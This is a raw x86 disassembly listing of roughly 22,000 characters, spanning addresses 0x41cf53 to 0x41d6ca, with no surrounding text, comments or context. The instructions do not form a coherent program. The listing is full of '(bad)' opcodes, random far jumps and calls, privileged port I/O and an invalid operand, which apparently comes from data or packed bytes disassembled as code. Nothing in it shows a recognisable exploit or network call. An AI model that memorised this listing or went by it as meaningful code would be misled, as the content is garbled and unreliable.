  41cf53:	jmp    0x41cf5f
  41cf55:	add    al,0x84
  41cf57:	sub    DWORD PTR [edi-0x63c98b25],ebx
  41cf5d:	loopne 0x41cf3f
  41cf5f:	(bad)  
  41cf60:	lods   eax,DWORD PTR ds:[esi]
  41cf61:	and    eax,eax
  41cf63:	popa   
  41cf64:	xor    cl,al
  41cf66:	(bad)  [edx+ebx*1-0x5cf070d3]
  41cf6d:	adc    eax,0xf16b210
  41cf72:	fst    DWORD PTR [edx-0x655aff17]
  41cf78:	push   0xffffffbc
  41cf7a:	fisub  WORD PTR [eax]
  41cf7c:	xchg   ecx,eax
  41cf7d:	(bad)  
  41cf7e:	clc    
  41cf7f:	or     esp,DWORD PTR [esi]
  41cf81:	sbb    ebx,DWORD PTR gs:[ebx]
  41cf84:	cmp    BYTE PTR [eax+0x7d],dh
  41cf87:	hlt    
  41cf88:	and    al,0x60
  41cf8a:	and    bh,BYTE PTR [edi+ebx*1-0x469f6e32]
  41cf91:	inc    eax
  41cf92:	(bad)  [eax]
  41cf94:	push   ds
  41cf95:	push   ebx
  41cf96:	sbb    DWORD PTR [esi-0x78],esi
  41cf99:	out    dx,al
  41cf9a:	inc    edi
  41cf9b:	or     al,0xd4
  41cf9d:	sbb    BYTE PTR [esi+0x79],ah
  41cfa0:	(bad)  
  41cfa1:	jns    0x41cfa2
  41cfa3:	sbb    eax,0x9c3fa6e
  41cfa8:	ficom  DWORD PTR [eax]
  41cfaa:	stos   DWORD PTR es:[edi],eax
  41cfab:	jbe    0x41cfa2
  41cfad:	loope  0x41cfcc
  41cfaf:	mov    edi,0xde883328
  41cfb4:	aad    0x5b
  41cfb6:	outs   dx,BYTE PTR ds:[esi]
  41cfb7:	and    esp,esi
  41cfb9:	and    bh,ch
  41cfbb:	dec    edi
  41cfbc:	push   es
  41cfbd:	fsub   DWORD PTR [ebp+ebp*2+0x46]
  41cfc1:	rcl    BYTE PTR [edx],cl
  41cfc3:	sub    al,0x86
  41cfc5:	push   ebx
  41cfc6:	rol    BYTE PTR [eax*2+0x610b5bfb],1
  41cfcd:	shr    edi,1
  41cfcf:	pop    ebp
  41cfd0:	(bad)  
  41cfd1:	push   0xfeed90fd
  41cfd6:	sub    DWORD PTR [ebx],edi
  41cfd8:	in     al,dx
  41cfd9:	xchg   edx,eax
  41cfda:	inc    ebx
  41cfdb:	ror    DWORD PTR [ecx-0xe],1
  41cfde:	and    DWORD PTR cs:[ecx-0x6e],eax
  41cfe2:	test   DWORD PTR [edi],0x8838b9ee
  41cfe8:	aas    
  41cfe9:	pop    esi
  41cfea:	aam    0xbc
  41cfec:	rcr    DWORD PTR ss:[eax-0x3a],0xef
  41cff1:	retf   0x15c0
  41cff4:	repz lds edi,FWORD PTR [esi-0x3f]
  41cff8:	xchg   edx,eax
  41cff9:	pop    ebx
  41cffa:	call   0xdd2bdf65
  41cfff:	sub    al,0xd5
  41d001:	jnp    0x41cfb5
  41d003:	ds enter 0xec21,0x14
  41d008:	pop    ebx
  41d009:	ins    DWORD PTR es:[edi],dx
  41d00a:	jl     0x41cfcd
  41d00c:	lds    ebx,FWORD PTR [esi-0x1a]
  41d00f:	mov    ebp,0xcf7b1922
  41d014:	mov    esp,0xb5049e4
  41d01a:	pop    ecx
  41d01b:	lea    esp,[edx+0x500dce00]
  41d021:	mov    ?,WORD PTR [esi+0x24]
  41d024:	jbe    0x41d070
  41d026:	les    edx,FWORD PTR [edx-0x4]
  41d029:	jbe    0x41d036
  41d02b:	jmp    eax
  41d02d:	xlat   BYTE PTR ds:[ebx]
  41d02e:	xchg   esi,eax
  41d02f:	mov    edx,0x145b8f6c
  41d034:	outs   dx,BYTE PTR ds:[esi]
  41d035:	push   es
  41d036:	outs   dx,BYTE PTR ds:[esi]
  41d037:	pusha  
  41d038:	aad    0x8d
  41d03a:	or     al,0x2d
  41d03c:	jecxz  0x41d05f
  41d03e:	cmp    eax,DWORD PTR [edx]
  41d040:	jbe    0x41d03f
  41d042:	cmp    eax,0x8533a9c6
  41d047:	sbb    eax,0x5af2ac3a
  41d04c:	es add eax,0xeb5f3d40
  41d052:	mov    bl,0x7a
  41d054:	scas   eax,DWORD PTR es:[edi]
  41d055:	dec    ebx
  41d056:	dec    ebx
  41d057:	xchg   esp,eax
  41d058:	xchg   ebx,eax
  41d059:	sub    BYTE PTR [ebx-0x31b1d8ac],ah
  41d05f:	fisubr DWORD PTR [ecx]
  41d061:	adc    dh,BYTE PTR fs:[edx+eiz*2+0x17]
  41d066:	and    BYTE PTR ds:[esi],dh
  41d069:	pop    edi
  41d06a:	sar    DWORD PTR [ebp+ebx*4+0x50],0xb4
  41d06f:	in     al,dx
  41d070:	add    BYTE PTR [ecx],ch
  41d072:	xor    al,0x26
  41d074:	mov    dh,0x77
  41d076:	mov    ebx,0x5905d828
  41d07b:	sbb    al,0xcf
  41d07d:	mov    esi,0x72d40831
  41d082:	dec    DWORD PTR [edi+0x40]
  41d085:	mov    ch,0x90
  41d087:	mov    ebp,0xa6f7a7cb
  41d08c:	xchg   ecx,eax
  41d08d:	add    ecx,DWORD PTR [edi-0x16]
  41d090:	push   ebx
  41d091:	add    esi,edx
  41d093:	adc    edx,DWORD PTR [ebp+eiz*2-0x680c700a]
  41d09a:	sbb    ebx,edi
  41d09c:	sbb    esp,DWORD PTR fs:[eax+edx*2-0xd]
  41d0a1:	into   
  41d0a2:	inc    edi
  41d0a3:	into   
  41d0a4:	mov    dl,0x79
  41d0a6:	mov    DWORD PTR [edx-0x4e],0x4262b559
  41d0ad:	mov    eax,ds:0xa3578d74
  41d0b2:	mov    DWORD PTR [ecx],0x4b7aff04
  41d0b8:	fst    QWORD PTR [eax]
  41d0ba:	mul    DWORD PTR [eax+0x1c]
  41d0bd:	int    0x7f
  41d0bf:	jno    0x41d139
  41d0c1:	imul   edi,DWORD PTR [esi-0x7d],0x6be596ef
  41d0c8:	test   eax,0x9ff99a1
  41d0cd:	xchg   edi,eax
  41d0ce:	mov    BYTE PTR [ebp-0x30d7bb4a],dl
  41d0d4:	and    eax,0xf1c3f69
  41d0d9:	mov    edx,DWORD PTR [ebx+edx*4+0x25b0890b]
  41d0e0:	pop    edi
  41d0e1:	add    BYTE PTR ds:0xf8ece45f,al
  41d0e7:	xchg   DWORD PTR [esi-0x28],ebx
  41d0ea:	mov    eax,ds:0x1fb6acb2
  41d0ef:	mov    BYTE PTR ds:0x1e648d9f,bh
  41d0f5:	cdq    
  41d0f6:	cmc    
  41d0f7:	adc    bh,BYTE PTR [ecx+edi*1]
  41d0fa:	mov    BYTE PTR [eax+edi*2-0x259d6421],ch
  41d101:	into   
  41d102:	into   
  41d103:	jl     0x41d0aa
  41d105:	jno    0x41d101
  41d107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d108:	jmp    0xf1c3780f
  41d10d:	jne    0x41d17a
  41d10f:	(bad)  [edx+0x21]
  41d112:	scas   al,BYTE PTR es:[edi]
  41d113:	push   ss
  41d114:	jo     0x41d15a
  41d116:	sbb    edi,edx
  41d118:	push   ecx
  41d119:	fnstcw WORD PTR [ebx]
  41d11b:	adc    al,0xd6
  41d11d:	inc    ecx
  41d11e:	fidivr DWORD PTR [edi+ecx*4]
  41d121:	cli    
  41d122:	or     DWORD PTR [edx],0x5565ace0
  41d128:	arpl   dx,cx
  41d12a:	jmp    0xa86d3258
  41d12f:	cmc    
  41d130:	(bad)  [ecx+0x7e]
  41d133:	sbb    al,0x40
  41d135:	xor    BYTE PTR [ebp-0x5e846505],dl
  41d13b:	add    BYTE PTR [edx],0xf
  41d13e:	cwde   
  41d13f:	jmp    0x41d1a4
  41d141:	jg     0x41d1a4
  41d143:	(bad)  
  41d144:	dec    ebp
  41d145:	push   cs
  41d146:	lds    esp,FWORD PTR [eax-0x76b0f81d]
  41d14c:	pusha  
  41d14d:	push   esi
  41d14e:	loop   0x41d1a2
  41d150:	add    BYTE PTR [edi+0x2e],bl
  41d153:	xor    ebx,DWORD PTR [eax-0x6507eeac]
  41d159:	iret   
  41d15a:	inc    esp
  41d15b:	and    edi,esp
  41d15d:	cmp    eax,0x3065d656
  41d162:	jmp    0xa5d1:0xce832ea5
  41d169:	sub    DWORD PTR [esi-0x6d2a9306],esp
  41d16f:	jmp    0x2817:0x8205c9e7
  41d176:	add    eax,0xa483d5af
  41d17b:	pop    ebx
  41d17c:	ja     0x41d1b6
  41d17e:	cmp    bh,al
  41d180:	or     al,0x1e
  41d182:	popa   
  41d183:	xor    BYTE PTR [edi],0xfb
  41d186:	nop
  41d187:	and    edi,0x9a9076b3
  41d18d:	xchg   DWORD PTR [esi],ebx
  41d18f:	pop    edx
  41d190:	add    BYTE PTR [ebp-0x55],0xbb
  41d194:	nop
  41d195:	icebp  
  41d196:	and    al,0xb2
  41d198:	cmp    ah,BYTE PTR [ebx]
  41d19a:	ins    DWORD PTR es:[edi],dx
  41d19b:	or     eax,DWORD PTR [eax]
  41d19d:	jno    0x41d1c6
  41d19f:	inc    edi
  41d1a0:	add    DWORD PTR [ecx+eiz*1],0x5d
  41d1a4:	xchg   edi,eax
  41d1a5:	ss cs cmp al,0x79
  41d1a9:	(bad)  
  41d1ab:	imul   eax,DWORD PTR [edi-0x4e],0x9b3ee543
  41d1b2:	dec    eax
  41d1b3:	jb     0x41d211
  41d1b5:	mov    edx,0xcf1bca11
  41d1ba:	push   edx
  41d1bb:	pop    es
  41d1bc:	bound  eax,QWORD PTR [edi+0x1b926aba]
  41d1c2:	jle    0x41d1b5
  41d1c4:	jmp    0x41d242
  41d1c6:	ret    0x55d0
  41d1c9:	inc    esi
  41d1ca:	pop    esp
  41d1cb:	into   
  41d1cc:	mov    al,ds:0x7bbbeed2
  41d1d1:	mov    cr5,esi
  41d1d4:	test   al,0x16
  41d1d6:	lahf   
  41d1d7:	int    0x9
  41d1d9:	pop    ebp
  41d1da:	out    dx,eax
  41d1db:	bound  esi,QWORD PTR [ebx]
  41d1dd:	push   eax
  41d1de:	lahf   
  41d1df:	push   edx
  41d1e0:	les    esi,FWORD PTR [edx-0x29]
  41d1e3:	std    
  41d1e4:	lods   eax,DWORD PTR ds:[esi]
  41d1e5:	not    DWORD PTR [edx]
  41d1e7:	div    DWORD PTR [ebp+0x6b]
  41d1ea:	xor    esi,DWORD PTR [eax-0x4ed4d371]
  41d1f0:	popf   
  41d1f1:	ins    DWORD PTR es:[edi],dx
  41d1f2:	cdq    
  41d1f3:	inc    edx
  41d1f4:	and    BYTE PTR [edx+0x2d],al
  41d1f7:	test   bh,bh
  41d1f9:	loop   0x41d1d7
  41d1fb:	jno    0x41d1d7
  41d1fd:	lahf   
  41d1fe:	push   ebp
  41d1ff:	in     al,0x9e
  41d201:	jmp    0x41d208
  41d203:	mov    ah,0xdb
  41d205:	addr16 inc edx
  41d207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d208:	(bad)  
  41d209:	fs xor al,0x3b
  41d20c:	out    dx,eax
  41d20d:	aam    0x5d
  41d20f:	push   cs
  41d210:	jns    0x41d1db
  41d212:	mov    ebx,DWORD PTR [ecx+0x124d9d88]
  41d218:	inc    esp
  41d219:	add    eax,0x50b3ae7e
  41d21e:	push   ecx
  41d21f:	mov    ecx,0xf69493f0
  41d224:	or     al,0xb4
  41d226:	mov    eax,ds
  41d228:	in     eax,0xab
  41d22a:	les    edi,FWORD PTR [edx-0x7d]
  41d22d:	pop    esi
  41d22e:	ss bnd jo 0x41d230
  41d232:	es pop ebp
  41d234:	pop    es
  41d235:	pop    edi
  41d236:	(bad)  
  41d237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d238:	mov    esi,0x780b9b70
  41d23d:	jecxz  0x41d1d1
  41d23f:	inc    esi
  41d240:	sub    bl,BYTE PTR ds:0xd84ca912
  41d246:	adc    al,0xfd
  41d248:	out    0xf4,al
  41d24a:	and    ebp,DWORD PTR [esi-0x404419a3]
  41d250:	cmp    dl,BYTE PTR [ebx+0x3de6cb9d]
  41d256:	add    DWORD PTR ds:0x3b402e27,0xfd88e278
  41d260:	adc    eax,edi
  41d262:	xchg   ebx,eax
  41d263:	mov    eax,0x9d2c8537
  41d268:	add    BYTE PTR [ecx-0x2a],al
  41d26b:	or     DWORD PTR [ebp+0x29],edi
  41d26e:	mov    cl,0x9d
  41d270:	fs sub eax,0x5c2d3c16
  41d276:	cmp    eax,0x50a2e1f7
  41d27b:	xchg   ebp,eax
  41d27c:	mov    dh,0xa3
  41d27e:	cdq    
  41d27f:	pusha  
  41d280:	sahf   
  41d281:	cwde   
  41d282:	hlt    
  41d283:	xor    BYTE PTR [edi+0x11bc0fe2],dl
  41d289:	pop    edi
  41d28a:	loopne 0x41d307
  41d28c:	jle    0x41d258
  41d28e:	mov    cs,WORD PTR [ebx+0x44]
  41d291:	shl    al,1
  41d293:	xor    bl,BYTE PTR [ecx]
  41d295:	push   ds
  41d296:	mov    ds:0xa1e7faa4,eax
  41d29b:	push   ecx
  41d29c:	adc    ebp,ebp
  41d29e:	pop    esp
  41d29f:	xchg   BYTE PTR [eax-0x41],cl
  41d2a2:	cdq    
  41d2a3:	in     eax,dx
  41d2a4:	pop    ebx
  41d2a5:	push   ebp
  41d2a6:	fdiv   DWORD PTR ds:0xb3ec06f9
  41d2ac:	fimul  DWORD PTR [eax]
  41d2ae:	pop    ecx
  41d2af:	xor    al,0xd4
  41d2b1:	jl     0x41d26a
  41d2b3:	xchg   edx,eax
  41d2b4:	push   0xbb0d41d5
  41d2b9:	fisttp DWORD PTR [edi-0x728ce801]
  41d2bf:	mov    ecx,DWORD PTR [edi]
  41d2c1:	popa   
  41d2c2:	mov    ebp,0x54b984dd
  41d2c7:	sbb    DWORD PTR [eax-0x1b22ce15],esi
  41d2cd:	xchg   ecx,eax
  41d2ce:	jle    0x41d2ad
  41d2d0:	dec    edi
  41d2d1:	push   esp
  41d2d2:	call   0x3c65:0x714afd3e
  41d2d9:	mov    ebx,0x3b9d3547
  41d2de:	pop    eax
  41d2df:	jecxz  0x41d28c
  41d2e1:	arpl   bx,cx
  41d2e3:	das    
  41d2e4:	inc    ebx
  41d2e5:	pop    es
  41d2e6:	out    0x2b,al
  41d2e8:	scas   al,BYTE PTR es:[edi]
  41d2e9:	scas   al,BYTE PTR es:[edi]
  41d2ea:	cmp    ebx,edx
  41d2ec:	out    0xe2,eax
  41d2ee:	sub    BYTE PTR [edx],0xbd
  41d2f1:	test   DWORD PTR [esi+0x3b9f789a],ebp
  41d2f7:	loop   0x41d318
  41d2f9:	loop   0x41d313
  41d2fb:	cmp    al,0x6e
  41d2fd:	pop    edi
  41d2fe:	push   edx
  41d2ff:	int    0xa4
  41d301:	push   es
  41d302:	imul   esi,ecx,0xd19688f6
  41d308:	mov    fs,WORD PTR [esp+ebp*1]
  41d30b:	ja     0x41d31c
  41d30d:	mov    ecx,0x176e5473
  41d312:	inc    esp
  41d313:	cli    
  41d314:	int3   
  41d315:	cwde   
  41d316:	sub    BYTE PTR [ecx],ah
  41d318:	mov    esi,0x4bd80609
  41d31d:	inc    ecx
  41d31e:	cmp    esi,edi
  41d320:	mov    ch,0xf5
  41d322:	lahf   
  41d323:	fiadd  DWORD PTR [ebp-0x5b9563da]
  41d329:	and    BYTE PTR [edx-0x5239ad3a],dh
  41d32f:	mov    ah,0xcd
  41d331:	or     DWORD PTR [ecx-0x14],ebp
  41d334:	push   cs
  41d335:	test   al,0x1e
  41d337:	call   0x5b40:0x9497184c
  41d33e:	mov    ds,WORD PTR [eax]
  41d340:	ins    BYTE PTR es:[edi],dx
  41d341:	jl     0x41d337
  41d343:	or     DWORD PTR [esi+0x63],0xe49d1c8d
  41d34a:	adc    DWORD PTR [ecx-0x15],0x767e7cd6
  41d351:	cld    
  41d352:	pmaxsw mm7,mm7
  41d355:	rol    BYTE PTR [edi+0x24e2379],1
  41d35b:	mov    ch,BYTE PTR ds:0x3d81f0c4
  41d361:	(bad)  
  41d362:	ss dec esp
  41d364:	jmp    0x41d386
  41d366:	mov    ecx,0xf86f48b7
  41d36b:	retf   0xef3c
  41d36e:	dec    DWORD PTR [ecx-0x491c3edd]
  41d374:	loopne 0x41d30d
  41d376:	jle    0x41d39b
  41d378:	push   cs
  41d379:	or     BYTE PTR [eax],bl
  41d37b:	sahf   
  41d37c:	xchg   esp,eax
  41d37d:	or     eax,0xbad7cbcf
  41d382:	dec    ebp
  41d383:	mov    dl,0xec
  41d385:	mov    ds:0x30dc4c08,eax
  41d38a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d38b:	jmp    0xb710:0x711b2e99
  41d392:	(bad)  
  41d393:	popa   
  41d394:	sub    al,BYTE PTR [eax]
  41d396:	xchg   ecx,eax
  41d397:	mov    ds:0x316bf597,al
  41d39c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d39d:	add    BYTE PTR [edx+0x2e16a95e],cl
  41d3a3:	xor    ch,BYTE PTR [esi+0x48c6c77b]
  41d3a9:	shr    BYTE PTR [edi+ebx*1+0x1b],1
  41d3ad:	push   ebx
  41d3ae:	xor    esp,DWORD PTR [ebx+0x14]
  41d3b1:	out    0xcb,al
  41d3b3:	pop    ss
  41d3b4:	push   eax
  41d3b5:	and    eax,0x955dc0b0
  41d3ba:	scas   al,BYTE PTR es:[edi]
  41d3bb:	sbb    al,0xfb
  41d3bd:	inc    ebx
  41d3be:	xor    al,0x97
  41d3c0:	push   0x24
  41d3c2:	jl     0x41d381
  41d3c4:	mov    DWORD PTR [edi],ecx
  41d3c6:	rcr    DWORD PTR [ebx-0x5dab0f64],1
  41d3cc:	mov    ebp,0xe96ffe5c
  41d3d1:	gs and al,dl
  41d3d4:	push   edi
  41d3d5:	xchg   edx,eax
  41d3d6:	or     al,0x61
  41d3d8:	daa    
  41d3d9:	jle    0x41d42c
  41d3db:	push   ebx
  41d3dc:	(bad)  
  41d3dd:	out    dx,al
  41d3de:	das    
  41d3df:	push   eax
  41d3e0:	jp     0x41d422
  41d3e2:	inc    eax
  41d3e3:	int    0xd4
  41d3e5:	in     eax,dx
  41d3e6:	dec    edi
  41d3e7:	inc    esi
  41d3e8:	jno    0x41d3cf
  41d3ea:	push   cs
  41d3eb:	cmp    esp,DWORD PTR [eax-0x71]
  41d3ee:	cwde   
  41d3ef:	pop    ss
  41d3f0:	lods   eax,DWORD PTR ds:[esi]
  41d3f1:	xlat   BYTE PTR ds:[ebx]
  41d3f2:	xor    eax,0x5b0c5007
  41d3f7:	rcl    cl,0x33
  41d3fa:	cli    
  41d3fb:	cmp    ebx,DWORD PTR [edi]
  41d3fd:	je     0x41d3b4
  41d3ff:	inc    esi
  41d400:	lods   al,BYTE PTR ds:[esi]
  41d401:	mov    ebp,0x7878e63f
  41d406:	pop    ebp
  41d407:	gs push esp
  41d409:	cmp    DWORD PTR [esi+0x2fb8bdfa],0x83239967
  41d413:	push   eax
  41d414:	out    dx,eax
  41d415:	clc    
  41d416:	push   edi
  41d417:	add    eax,DWORD PTR [ebx+ebp*8]
  41d41a:	rol    bl,1
  41d41c:	inc    edx
  41d41d:	aad    0xb9
  41d41f:	stc    
  41d420:	cmp    eax,DWORD PTR [ebp-0x5c24385f]
  41d426:	dec    edx
  41d427:	not    BYTE PTR [ebx]
  41d429:	jno    0x41d40f
  41d42b:	jns    0x41d486
  41d42d:	adc    al,0x5d
  41d42f:	stos   BYTE PTR es:[edi],al
  41d430:	pop    ecx
  41d431:	cmp    al,0xcf
  41d433:	(bad)  
  41d434:	push   ss
  41d435:	mov    dh,0xfe
  41d437:	gs pop ebp
  41d439:	sti    
  41d43a:	xor    esi,DWORD PTR [eax+eax*2]
  41d43d:	mov    bh,0x6d
  41d43f:	aas    
  41d440:	int3   
  41d441:	dec    ecx
  41d442:	xchg   BYTE PTR [ebp-0x3b],bl
  41d445:	fstp   QWORD PTR [edx-0x24]
  41d448:	daa    
  41d449:	addr16 pop ebp
  41d44b:	jno    0x41d435
  41d44d:	test   DWORD PTR [edi+0x67],edi
  41d450:	in     eax,0x80
  41d452:	mov    ds:0x76cf3b96,al
  41d457:	push   edi
  41d458:	loop   0x41d436
  41d45a:	pop    ds
  41d45b:	arpl   WORD PTR [edi],di
  41d45d:	dec    ebp
  41d45e:	sbb    esi,edi
  41d460:	xchg   ebp,eax
  41d461:	pop    eax
  41d462:	pop    ds
  41d463:	or     ebp,DWORD PTR [edi-0xcaf62ba]
  41d469:	enter  0x7b76,0x5
  41d46d:	add    ebp,esp
  41d46f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d470:	jnp    0x41d448
  41d472:	bound  esp,QWORD PTR [ebp-0x1e88f903]
  41d478:	cmp    al,0x13
  41d47a:	sbb    edi,esi
  41d47c:	jle    0x41d4a5
  41d47e:	enter  0xc11d,0x15
  41d482:	or     BYTE PTR [eax],0x16
  41d485:	jge    0x41d444
  41d487:	shl    BYTE PTR [edi-0x123ba68],1
  41d48d:	aas    
  41d48e:	or     al,0xd3
  41d490:	call   0xaf0718a1
  41d495:	daa    
  41d496:	adc    cl,dh
  41d498:	mov    ds:0x38d71e6c,al
  41d49d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d49e:	and    edi,DWORD PTR [edx-0x7b3480ed]
  41d4a4:	jo     0x41d441
  41d4a6:	cmp    BYTE PTR [eax],bl
  41d4a8:	lods   eax,DWORD PTR ds:[esi]
  41d4a9:	mov    bh,0xcd
  41d4ab:	mov    DWORD PTR [edx+0xc2adbb5],esp
  41d4b1:	cmp    eax,0xdfc780bb
  41d4b6:	popa   
  41d4b7:	aaa    
  41d4b8:	(bad)
  41d4bc:	in     eax,dx
  41d4bd:	and    DWORD PTR [ecx-0x6a],esp
  41d4c0:	js     0x41d523
  41d4c2:	sub    DWORD PTR [ecx-0x72],ebx
  41d4c5:	sbb    esp,DWORD PTR [edx-0x62cf324a]
  41d4cb:	pop    ecx
  41d4cc:	into   
  41d4cd:	das    
  41d4ce:	or     eax,0xefb137f9
  41d4d3:	push   esi
  41d4d4:	js     0x41d4e3
  41d4d6:	outs   dx,DWORD PTR ds:[esi]
  41d4d7:	jo     0x41d54c
  41d4d9:	inc    ebp
  41d4da:	xchg   DWORD PTR [ebx+edi*4+0x54],eax
  41d4de:	xchg   ebp,eax
  41d4df:	clc    
  41d4e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4e1:	mov    ebx,0x6731bc72
  41d4e6:	xor    eax,0xede34327
  41d4eb:	pop    ds
  41d4ec:	out    0x83,eax
  41d4ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4ef:	mov    ebp,0xa3cce392
  41d4f4:	and    DWORD PTR [eax-0x6e349d8a],edi
  41d4fa:	lock cmc 
  41d4fc:	pop    esp
  41d4fd:	stc    
  41d4fe:	es mov al,0xb1
  41d501:	add    bl,bh
  41d503:	pop    es
  41d504:	adc    esp,esp
  41d506:	jecxz  0x41d4af
  41d508:	shr    BYTE PTR [edi+0xd],0x12
  41d50c:	mov    dh,0x84
  41d50e:	inc    esp
  41d50f:	mov    cl,0xae
  41d511:	mov    ebp,0x37c3fb88
  41d516:	jmp    0xddd9:0x76332771
  41d51d:	add    BYTE PTR [edi],0x19
  41d520:	or     DWORD PTR [eax-0x40],ebp
  41d523:	gs rcl BYTE PTR ss:[ebp+ecx*8+0x543149b3],cl
  41d52c:	fwait
  41d52d:	dec    ebp
  41d52e:	mov    cl,0x4c
  41d530:	shl    BYTE PTR [esp+eiz*8-0x51fd2108],1
  41d537:	pop    ecx
  41d538:	int    0xff
  41d53a:	cmp    BYTE PTR [esi],ch
  41d53c:	dec    edi
  41d53d:	pop    ecx
  41d53e:	jl     0x41d523
  41d540:	adc    esp,DWORD PTR [ecx-0x7b]
  41d543:	and    DWORD PTR [eax-0x60],eax
  41d546:	jmp    0x3936:0x3028878c
  41d54d:	sub    DWORD PTR [eax+0x4a],edx
  41d550:	ds pop ecx
  41d552:	xchg   DWORD PTR [esi+ebp*1],esi
  41d555:	bound  esi,QWORD PTR [ebx]
  41d557:	or     esi,ecx
  41d559:	mov    WORD PTR [edi],ss
  41d55b:	cs sub eax,0xdd427ae2
  41d561:	call   0x43f2:0x3c9fb3c8
  41d568:	not    BYTE PTR [eax+0x5aecc20d]
  41d56e:	and    dl,BYTE PTR [esi]
  41d570:	aam    0xd5
  41d572:	fadd   DWORD PTR ds:[edx+ebp*8-0x309b3282]
  41d57a:	and    eax,0x31446b1b
  41d57f:	shl    DWORD PTR [esi+0x672613f8],cl
  41d585:	adc    al,0x82
  41d587:	sbb    edx,ecx
  41d589:	adc    eax,0x2c40a930
  41d58e:	sbb    BYTE PTR [ebx+0x1a3cb618],ah
  41d594:	ret    
  41d595:	(bad)  
  41d597:	cmp    edi,esi
  41d599:	ds in  eax,0x3d
  41d59c:	and    DWORD PTR [edi+edx*2-0x5b997237],eax
  41d5a3:	aaa    
  41d5a4:	xchg   DWORD PTR [ecx-0x4c],esi
  41d5a7:	inc    ebx
  41d5a8:	inc    edx
  41d5a9:	push   cs
  41d5aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5ab:	mov    ecx,0x4aca2b5b
  41d5b0:	jns    0x41d62f
  41d5b2:	int3   
  41d5b3:	jmp    0xb5137ce9
  41d5b8:	adc    edi,DWORD PTR [eax-0x7084d44e]
  41d5be:	xor    esp,DWORD PTR [eax]
  41d5c0:	mov    eax,0x727f88f0
  41d5c5:	out    dx,al
  41d5c6:	cmc    
  41d5c7:	push   esi
  41d5c8:	repnz das 
  41d5ca:	xor    eax,0x5740ba54
  41d5cf:	add    ch,BYTE PTR [ecx]
  41d5d1:	loop   0x41d57e
  41d5d3:	inc    ebp
  41d5d4:	int3   
  41d5d5:	in     eax,0xb4
  41d5d7:	push   es
  41d5d8:	stc    
  41d5d9:	xor    BYTE PTR [eax-0x2c],dh
  41d5dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5dd:	dec    esp
  41d5de:	aam    0x13
  41d5e0:	or     eax,0x4dc7b190
  41d5e5:	push   ebx
  41d5e6:	pop    es
  41d5e7:	and    al,0xa0
  41d5e9:	ja     0x41d653
  41d5eb:	jae    0x41d5f3
  41d5ed:	mov    bl,0x20
  41d5ef:	ins    DWORD PTR es:[edi],dx
  41d5f0:	cld    
  41d5f1:	and    DWORD PTR [eax-0x7f],ebp
  41d5f4:	call   0xec82:0x1b86898b
  41d5fb:	ja     0x41d5cd
  41d5fd:	fs mov edx,fs
  41d600:	arpl   WORD PTR [ebx-0x53],cx
  41d603:	xor    DWORD PTR [ebx-0x415eac76],edi
  41d609:	mov    bh,0xe0
  41d60b:	cmp    BYTE PTR [edx],al
  41d60d:	jo     0x41d595
  41d60f:	push   ss
  41d610:	jae    0x41d655
  41d612:	xchg   esp,eax
  41d613:	scas   eax,DWORD PTR es:[edi]
  41d614:	jge    0x41d66e
  41d616:	out    dx,al
  41d617:	inc    ebx
  41d618:	ins    WORD PTR es:[edi],dx
  41d61a:	stos   DWORD PTR es:[edi],eax
  41d61b:	pop    ecx
  41d61c:	sbb    eax,0xce9ab450
  41d621:	mov    BYTE PTR fs:[edi+0x33],dl
  41d625:	mov    ecx,ecx
  41d627:	or     al,0xb7
  41d629:	cli    
  41d62a:	jbe    0x41d5c9
  41d62c:	popa   
  41d62d:	js     0x41d5ec
  41d62f:	daa    
  41d630:	mov    bl,0xfe
  41d632:	fwait
  41d633:	repz int 0xbd
  41d636:	xchg   ebp,eax
  41d637:	shl    bh,1
  41d639:	sub    eax,0xff257bab
  41d63e:	daa    
  41d63f:	test   BYTE PTR [edi-0x63],0xd4
  41d643:	jp     0x41d5c7
  41d645:	mov    DWORD PTR [eax-0x3b],ecx
  41d648:	lock pushf 
  41d64a:	hlt    
  41d64b:	adc    eax,0xb3a1e095
  41d650:	jns    0x41d661
  41d652:	xlat   BYTE PTR ds:[ebx]
  41d653:	sub    eax,0x1ed938f6
  41d658:	adc    ch,bh
  41d65a:	cmp    eax,0x525be503
  41d65f:	es std 
  41d661:	out    0xd3,eax
  41d663:	push   edi
  41d664:	sbb    BYTE PTR [esi+eiz*8-0x65],bl
  41d668:	sbb    BYTE PTR cs:[ecx+0x69],bh
  41d66c:	fdivr  DWORD PTR [ecx+0xdbda62d]
  41d672:	in     eax,dx
  41d673:	repz sub ch,dl
  41d676:	xor    al,0x89
  41d678:	inc    ebx
  41d679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d67a:	ins    DWORD PTR es:[edi],dx
  41d67b:	dec    ebp
  41d67c:	es int 0x1e
  41d67f:	push   eax
  41d680:	dec    edi
  41d681:	jns    0x41d66c
  41d683:	add    BYTE PTR [edi],ch
  41d685:	jae    0x41d68a
  41d687:	push   ebx
  41d688:	dec    ebp
  41d689:	mov    ecx,0x2e731624
  41d68e:	outs   dx,DWORD PTR ds:[esi]
  41d68f:	inc    ebx
  41d690:	(bad)
  41d694:	(bad)  
  41d695:	adc    DWORD PTR ds:0xf656658f,esi
  41d69b:	ret    0xc447
  41d69e:	ds sbb eax,0x106bb424
  41d6a4:	lahf   
  41d6a5:	or     eax,0xc86324d2
  41d6aa:	mov    esp,0x18bced26
  41d6af:	pushf  
  41d6b0:	push   ebp
  41d6b1:	hlt    
  41d6b2:	jb     0x41d68a
  41d6b4:	sar    bh,0x97
  41d6b7:	push   0x1cc5ead6
  41d6bc:	lods   eax,DWORD PTR ds:[esi]
  41d6bd:	cmp    eax,0x53cabdea
  41d6c2:	cmp    al,0xf0
  41d6c4:	sub    esp,DWORD PTR [eax]
  41d6c6:	scas   al,BYTE PTR es:[edi]
  41d6c7:	out    0xb4,al
  41d6c9:	push   ecx
  41d6ca:	mov    bh,0x97
